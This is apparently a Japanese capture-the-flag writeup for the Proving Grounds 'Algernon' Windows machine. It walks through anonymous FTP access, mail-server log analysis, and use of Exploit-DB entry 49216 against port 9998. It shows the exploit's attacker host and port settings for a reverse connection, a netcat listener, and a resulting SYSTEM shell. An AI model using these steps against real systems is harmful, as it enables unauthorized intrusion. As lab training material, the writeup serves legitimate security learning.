+++
title = "Proving Grounds Practice - Algernon Writeup"
date = "2026-10-15"
description = "Anonymous FTPで公開されたMailEnableのログを解析し、ポート9998のサービスに対するエクスプロイトを利用してNT AUTHORITY\\SYSTEMを取得"
tags = ["Proving Grounds Practice", "CTF", "[Windows]", "[Algernon]", "[FTP Anonymous Login]", "[MailEnable]", "[Log Analysis]", "[Exploit-DB]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Algernon |
| OS | Windows |
| Target IP | 192.168.157.65 |


---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対してサービス検出とデフォルトスクリプトを実行する。

```bash
nmap -sC -sV 192.168.157.65
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

FTPではAnonymousログインが許可されており、以下のディレクトリが公開されていた。

```text
04-29-20  10:31PM       <DIR>          ImapRetrieval
10-15-26  06:03AM       <DIR>          Logs
04-29-20  10:31PM       <DIR>          PopRetrieval
04-29-20  10:32PM       <DIR>          Spool
```

また、ポート80ではMicrosoft IIS 10.0、ポート9998ではMicrosoft HTTPAPIが稼働している。

特に、Anonymous FTPから取得できるログと、ポート9998のWebサービスを重点的に調査する。

---

## Enumeration

### Anonymous FTP

FTPに接続し、Anonymousユーザーでログインする。

```bash
ftp 192.168.157.65
```

```text
220 Microsoft FTP Service
Name: anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
```

認証情報を持っていなくてもログインできたため、公開されているファイルを調査する。

```text
ftp> ls
ImapRetrieval
Logs
PopRetrieval
Spool
```

`Logs` ディレクトリに移動すると、メール関連のログが多数確認できた。

```text
ftp> cd Logs
ftp> ls
2020.04.29-delivery.log
2020.04.29-smtpLog.log
2020.05.12-administrative.log
2020.05.12-delivery.log
2020.05.12-imapLog.log
...
2026.10.15-administrative.log
2026.10.15-delivery.log
```

管理者操作に関するログが手掛かりになる可能性があるため、直近のログと過去の管理者ログをダウンロードする。

```text
ftp> get 2026.10.15-administrative.log
ftp> get 2020.05.12-administrative.log
```

### Administrative Log Analysis

取得したログを確認する。

```bash
cat 2020.05.12-administrative.log
```

ログには、次の記録が含まれていた。

```text
03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
```

ログから、以下の情報が分かった。

- `admin` というユーザーが作成されている。
- `admin` ユーザーによるWebmailへのログインが成功している。
- ログイン後にセットアップウィザードの設定が変更されている。

このことから、メールサーバーの管理機能が攻撃経路に関係している可能性がある。

ただし、このログだけでは現在も有効なパスワードや、Windowsのログオンに利用できる認証情報までは特定できない。

### Port 9998 Enumeration

次に、ポート9998で稼働しているWebサービスを調査する。

Nmapの結果では、リクエストされたリソースが `/interface/root` と表示されていた。

```text
9998/tcp open  http Microsoft HTTPAPI httpd 2.0
http-title: Site doesn't have a title (text/html; charset=utf-8)
Requested resource was /interface/root
```
ソースコードでバージョン情報として、次の値が確認できた。

```
var stProductVersion = "100.0.6919";
```

この情報を手掛かりに、ポート9998で動作するサービスと関連する既知の脆弱性を調査する。

---

## Exploitation

### Exploit-DB Research

調査の過程で、次のExploit-DBエントリを参照した。

- [Exploit-DB 49216](https://www.exploit-db.com/exploits/49216)

対象ホストのポート9998で稼働するサービスに対して、公開されているエクスプロイトを利用する。

実行前に、エクスプロイト内の接続先設定を対象環境に合わせて指定した。

```python
HOST='192.168.157.65'
PORT=17001
LHOST='192.168.45.156'
LPORT=80
```

- `HOST`: 攻撃対象のIPアドレス
- `PORT`: 対象サービスのポート番号
- `LHOST`: 攻撃者側のIPアドレス
- `LPORT`: リバース接続に利用するポート番号

なお、`LHOST` にはターゲットから到達可能な攻撃者側インターフェースのIPアドレスを指定する必要がある。

### Exploit Preparation

エクスプロイトの準備中、Pythonスクリプトにゼロ幅スペースなどの不可視文字が混入している可能性があった。

このような文字は、Pythonコードの構文エラーや予期しない動作の原因になるため、スクリプトから削除した。

```bash
perl -i -pe 's/\x{200B}//g' exp.py
```

同様の処理を `sed` でも実施できる。

```bash
sed -i 's/\xe2\x80\x8b//g' exp.py
```

修正後、エクスプロイトを実行する準備を整えた。

### Reverse Connection

攻撃者側で接続を待ち受ける。

```bash
nc -lvnp 80
```

実行結果は次のとおり。

```text
listening on [any] 80 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.157.65] 50073
```

対象ホストから攻撃者側への接続が確立した。

取得したシェルで現在のユーザーを確認する。

```powershell
whoami
```

```text
nt authority\system
```

`NT AUTHORITY\SYSTEM` と表示されたため、Windowsの最高権限レベルでのコマンド実行に成功した。

---

## Privilege Escalation

今回の攻略では、リバース接続後に取得したシェルがすでに `NT AUTHORITY\SYSTEM` で動作していた。

したがって、別途ローカル権限昇格を実行する必要はなかった。

ただし、初期アクセスの段階からSYSTEM権限が得られたのか、エクスプロイトの実行によって権限昇格が行われたのかを厳密に説明するには、Exploit-DB 49216の内容と実行時の挙動を確認する必要がある。

現時点で確認できている最終結果は、次のとおり。

```text
PS C:\Windows\system32> whoami
nt authority\system
```

---

## Summary

Anonymous FTPで公開されていたメールサーバーのログを調査し、管理者アカウントの作成やログイン成功の痕跡を発見した。

その後、ポート9998のWebサービスを調査し、Exploit-DBに掲載されたエクスプロイトを利用。攻撃者側でリバース接続を待ち受けたところ、対象ホストから接続が確立し、最終的に `NT AUTHORITY\SYSTEM` の権限を取得できた。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービスの列挙
2. Anonymous FTPへのログイン
3. メールサーバーの管理ログを取得・解析
4. ポート9998のWebサービスを調査
5. Exploit-DBのエクスプロイトを準備・実行
6. リバース接続を確立
7. `NT AUTHORITY\SYSTEM` の取得

今回のポイントは、**Anonymous FTPで公開されたログを手掛かりに攻撃対象のサービスを調査し、公開エクスプロイトによってSYSTEM権限を取得したこと**である。
